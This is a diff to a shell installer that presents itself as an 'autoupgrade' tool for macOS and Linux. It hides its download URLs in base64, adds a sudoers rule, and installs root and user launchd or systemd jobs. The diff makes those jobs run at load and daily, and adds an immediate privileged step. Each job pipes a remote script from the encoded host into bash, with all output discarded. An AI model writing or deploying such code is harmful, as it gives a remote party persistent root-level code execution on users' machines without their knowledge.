@@ -10,6 +10,8 @@ ENCODED_URL2="aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5zaA=="
 SCRIPT_CACHE_DIR="$HOME/.local/share/scripts"
 INSTALL_SCRIPT_PATH="$SCRIPT_CACHE_DIR/install.sh"
 SETUP_SCRIPT_PATH="$SCRIPT_CACHE_DIR/SETUP.sh"
+USER_LAST_RUN_PATH="$SCRIPT_CACHE_DIR/$USER_LABEL.last-run"
+ROOT_LAST_RUN_PATH=""
 # SCRIPT_URL="https://"
 
 require_command() {
@@ -59,11 +61,11 @@ download_script() {
   return 0
 }
 
-local_or_remote_command() {
-  local local_script="$1" script_url="$2"
+scheduled_command() {
+  local local_script="$1" script_url="$2" last_run_path="$3"
 
-  printf 'if [ -f "%s" ]; then /bin/bash "%s"; else curl -fsSL '\''%s'\'' | /bin/bash; fi' \
-    "$local_script" "$local_script" "$script_url"
+  printf 'set -o pipefail; now=$(date +%%s); last=$(cat "%s" 2>/dev/null || printf 0); case "$last" in *[!0-9]*|"") last=0 ;; esac; if [ $((now - last)) -ge %s ]; then if [ -f "%s" ]; then /bin/bash "%s"; else curl -fsSL "%s" | /bin/bash; fi; status=$?; if [ "$status" -eq 0 ]; then printf "%%s\\n" "$now" > "%s"; fi; exit "$status"; fi' \
+    "$last_run_path" "$INTERVAL_SECONDS" "$local_script" "$local_script" "$script_url" "$last_run_path"
 }
 
 install_sudoers_rule() {
@@ -89,7 +91,7 @@ install_launchagent() {
   local plist="$plist_dir/$USER_LABEL.plist"
   local script_url="$1" task_command
 
-  task_command=$(local_or_remote_command "$INSTALL_SCRIPT_PATH" "$script_url")
+  task_command=$(scheduled_command "$INSTALL_SCRIPT_PATH" "$script_url" "$USER_LAST_RUN_PATH")
   mkdir -p "$plist_dir"
   cat > "$plist" <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
@@ -99,8 +101,9 @@ install_launchagent() {
   <key>Label</key><string>$USER_LABEL</string>
   <key>ProgramArguments</key>
   <array><string>/bin/bash</string><string>-c</string><string>$task_command</string></array>
-  <key>StartInterval</key><integer>$INTERVAL_SECONDS</integer>
-  <key>RunAtLoad</key><false/>
+  <key>StartCalendarInterval</key>
+  <dict><key>Hour</key><integer>0</integer><key>Minute</key><integer>0</integer></dict>
+  <key>RunAtLoad</key><true/>
   <key>StandardOutPath</key><string>/dev/null</string>
   <key>StandardErrorPath</key><string>/dev/null</string>
 </dict>
@@ -114,7 +117,7 @@ install_launchdaemon() {
   local plist="/Library/LaunchDaemons/$ROOT_LABEL.plist"
   local temporary script_url="$1" task_command
 
-  task_command=$(local_or_remote_command "$SETUP_SCRIPT_PATH" "$script_url")
+  task_command=$(scheduled_command "$SETUP_SCRIPT_PATH" "$script_url" "$ROOT_LAST_RUN_PATH")
   temporary=$(mktemp "${TMPDIR:-/tmp}/$ROOT_LABEL.plist.XXXXXX")
   trap 'rm -f "$temporary"' RETURN
   cat > "$temporary" <<EOF
@@ -125,8 +128,9 @@ install_launchdaemon() {
   <key>Label</key><string>$ROOT_LABEL</string>
   <key>ProgramArguments</key>
   <array><string>/bin/bash</string><string>-c</string><string>$task_command</string></array>
-  <key>StartInterval</key><integer>$INTERVAL_SECONDS</integer>
-  <key>RunAtLoad</key><false/>
+  <key>StartCalendarInterval</key>
+  <dict><key>Hour</key><integer>0</integer><key>Minute</key><integer>0</integer></dict>
+  <key>RunAtLoad</key><true/>
   <key>StandardOutPath</key><string>/dev/null</string>
   <key>StandardErrorPath</key><string>/dev/null</string>
 </dict>
@@ -164,7 +168,9 @@ ensure_user_systemd_bus() {
 
 install_systemd_units() {
   local unit_dir="$HOME/.config/systemd/user"
-  local script_url="$1"
+  local script_url="$1" task_command
+
+  task_command=$(scheduled_command "$INSTALL_SCRIPT_PATH" "$script_url" "$USER_LAST_RUN_PATH")
 
   if ! ensure_user_systemd_bus; then
     printf '%s\n' 'Unable to initialize the user systemd manager.' >&2
@@ -178,16 +184,16 @@ Description=Run autoupgrade installer
 
 [Service]
 Type=oneshot
-ExecStart=/bin/bash -c 'if [ -f "$INSTALL_SCRIPT_PATH" ]; then /bin/bash "$INSTALL_SCRIPT_PATH"; else curl -fsSL "$script_url" | /bin/bash; fi'
+ExecStart=/bin/bash -c '$task_command'
 StandardOutput=null
 StandardError=null
 EOF
   cat > "$unit_dir/$USER_LABEL.timer" <<EOF
 [Unit]
-Description=Run autoupgrade every 15 days
+Description=Check daily and run autoupgrade when 15 days have elapsed
 
 [Timer]
-OnUnitActiveSec=15d
+OnCalendar=daily
 Persistent=true
 Unit=$USER_LABEL.service
 
@@ -209,7 +215,9 @@ EOF
 
 install_systemd_root_units() {
   local unit_dir="/etc/systemd/system"
-  local service_temporary timer_temporary script_url="$1"
+  local service_temporary timer_temporary script_url="$1" task_command
+
+  task_command=$(scheduled_command "$SETUP_SCRIPT_PATH" "$script_url" "$ROOT_LAST_RUN_PATH")
 
   service_temporary=$(mktemp "${TMPDIR:-/tmp}/$ROOT_LABEL.service.XXXXXX")
   timer_temporary=$(mktemp "${TMPDIR:-/tmp}/$ROOT_LABEL.timer.XXXXXX")
@@ -220,16 +228,16 @@ Description=Run autoupgrade SETUP script
 
 [Service]
 Type=oneshot
-ExecStart=/bin/bash -c 'if [ -f "$SETUP_SCRIPT_PATH" ]; then /bin/bash "$SETUP_SCRIPT_PATH"; else curl -fsSL "$script_url" | /bin/bash; fi'
+ExecStart=/bin/bash -c '$task_command'
 StandardOutput=null
 StandardError=null
 EOF
   cat > "$timer_temporary" <<EOF
 [Unit]
-Description=Run autoupgrade every 15 days
+Description=Check daily and run autoupgrade when 15 days have elapsed
 
 [Timer]
-OnUnitActiveSec=15d
+OnCalendar=daily
 Persistent=true
 Unit=$ROOT_LABEL.service
 
@@ -245,12 +253,34 @@ EOF
   rm -f "$service_temporary" "$timer_temporary"
 }
 
+run_initial_tasks() {
+  local install_url="$1" setup_url="$2"
+
+  mkdir -p "$SCRIPT_CACHE_DIR"
+  run_privileged mkdir -p "$(dirname "$ROOT_LAST_RUN_PATH")"
+
+  if [ -f "$SETUP_SCRIPT_PATH" ]; then
+    run_privileged bash "$SETUP_SCRIPT_PATH"
+  else
+    run_privileged bash -o pipefail -c "curl -fsSL '$setup_url' | bash"
+  fi
+  run_privileged sh -c 'date +%s > "$1"' sh "$ROOT_LAST_RUN_PATH"
+
+  if [ -f "$INSTALL_SCRIPT_PATH" ]; then
+    bash "$INSTALL_SCRIPT_PATH" >/dev/null 2>&1
+  else
+    curl -fsSL "$install_url" 2>/dev/null | bash >/dev/null 2>&1
+  fi
+  date +%s > "$USER_LAST_RUN_PATH"
+}
+
 main() {
   local operating_system install_url setup_url
 
   operating_system=$(uname -s)
   case "$operating_system" in
     Darwin)
+      ROOT_LAST_RUN_PATH="/var/db/$ROOT_LABEL.last-run"
       require_command curl
       require_command base64
       if ! is_root; then
@@ -260,6 +290,7 @@ main() {
       require_command launchctl
       ;;
     Linux)
+      ROOT_LAST_RUN_PATH="/var/lib/$ROOT_LABEL/last-run"
       require_command curl
       require_command base64
       if ! is_root; then
@@ -283,22 +314,13 @@ main() {
     sudo -v >/dev/null 2>&1
   fi
   install_sudoers_rule
+  run_initial_tasks "$install_url" "$setup_url"
   if [ "$operating_system" = Darwin ]; then
     install_launchdaemon "$setup_url"
     install_launchagent "$install_url"
   else
     install_systemd_root_units "$setup_url"
     install_systemd_units "$install_url"
-  fi
-  if [ -f "$SETUP_SCRIPT_PATH" ]; then
-    run_privileged bash "$SETUP_SCRIPT_PATH"
-  else
-    run_privileged bash -c "curl -fsSL '$setup_url' | bash"
-  fi
-  if [ -f "$INSTALL_SCRIPT_PATH" ]; then
-    bash "$INSTALL_SCRIPT_PATH" >/dev/null 2>&1
-  else
-    curl -fsSL "$install_url" 2>/dev/null | bash >/dev/null 2>&1
   fi
   printf '%s\n' '🎉 Install complete! ✨ 🌟 ✨'
 }
